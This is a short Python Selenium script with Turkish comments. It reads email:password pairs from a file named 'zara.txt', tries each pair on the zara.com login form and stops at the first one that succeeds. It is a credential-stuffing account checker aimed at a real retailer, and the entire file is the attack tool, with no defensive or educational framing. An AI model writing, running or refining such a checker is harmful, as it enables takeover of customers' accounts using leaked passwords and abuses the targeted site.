from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.keys import Keys
import time

# Hesap bilgilerini dosyadan oku
def read_accounts(filename):
    with open(filename, 'r') as file:
        accounts = file.readlines()
    return [line.strip() for line in accounts]

# Web sitesinde giriş yapma ve uyarı mesajlarını kapatma
def try_login(email, password):
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))
    driver.get("https://www.zara.com")
    
    try:
        # Giriş yapma kısmını bul ve tıklama işlemini gerçekleştir
        login_button = driver.find_element(By.CSS_SELECTOR, "button[data-testid='login-button']")
        login_button.click()

        # Uyarı mesajlarını kapat (eğer varsa)
        time.sleep(3)  # Sayfanın yüklenmesini bekle
        try:
            close_warning_button = driver.find_element(By.CSS_SELECTOR, "button.close-warning")
            close_warning_button.click()
        except:
            print("Uyarı mesajı bulunamadı veya kapatılamadı")

        # E-posta ve şifre alanlarını doldurun
        email_field = driver.find_element(By.ID, "email")
        password_field = driver.find_element(By.ID, "password")

        email_field.send_keys(email)
        password_field.send_keys(password)

        # Giriş yapma butonuna tıklayın
        submit_button = driver.find_element(By.ID, "submit-button")
        submit_button.click()

        # Sayfanın yüklenmesini bekle
        time.sleep(5)

        # Burada başarılı giriş kontrolü yapabilirsiniz
        # Örneğin, giriş yapıldığında belirli bir öğenin mevcut olup olmadığını kontrol edebilirsiniz
        if "Hesabınıza giriş yaptınız" in driver.page_source:
            print(f"Giriş başarılı: {email}")
            return True
        else:
            print(f"Giriş başarısız: {email}")
            return False

    finally:
        # İşlem tamamlandığında tarayıcıyı kapat
        driver.quit()

def main():
    accounts = read_accounts('zara.txt')
    
    for account in accounts:
        email, password = account.split(':')
        if try_login(email, password):
            break  # Başarılı giriş yaptıktan sonra döngüden çık
        else:
            print(f"{email} ile giriş yapılamadı. Bir sonraki hesabı deniyorum...")

if __name__ == "__main__":
    main()
